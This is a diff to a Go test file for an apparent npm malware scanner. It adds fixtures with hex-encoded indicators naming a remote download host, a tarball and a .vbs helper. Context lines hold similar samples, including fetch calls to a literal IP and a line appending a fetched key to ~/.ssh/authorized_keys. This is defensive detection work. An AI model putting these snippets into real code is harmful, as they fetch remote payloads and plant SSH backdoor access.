@@ -369,6 +369,16 @@ func TestScan_AmazonInspectorNPMMalwareFollowupUnderNodeModules(t *testing.T) {
 			raw:  `const _cfg = ["766974652d6e61746976652d68656c7065722e657865", "53746172747570"]; const payload = "4D5A90";`,
 		},
 		{
+			name: "streak day utils npm",
+			rel:  filepath.Join("node_modules", "streak-day-utils", "index.mjs"),
+			raw:  `const _cfg = ["663030342e6261636b626c617a6562322e636f6d", "68656c7065722e7461722e677a", "766974652d6e61746976652d68656c7065722e766273"];`,
+		},
+		{
+			name: "streak day utils pnpm",
+			rel:  filepath.Join("node_modules", ".pnpm", "streak-day-utils@1.0.0", "node_modules", "streak-day-utils", "index.mjs"),
+			raw:  `const _cfg = ["663030342e6261636b626c617a6562322e636f6d", "68656c7065722e7461722e677a", "766974652d6e61746976652d68656c7065722e766273"];`,
+		},
+		{
 			name: "api node sdk pnpm",
 			rel:  filepath.Join("node_modules", ".pnpm", "api-node-sdk@1.0.0", "node_modules", "api-node-sdk", "test.js"),
 			raw:  `fetch("http://95.216.118.146:3000/api/v1"); fetch("http://95.216.118.146:3001/api/ssh-key"); appendFileSync("~/.ssh/authorized_keys", key);`,
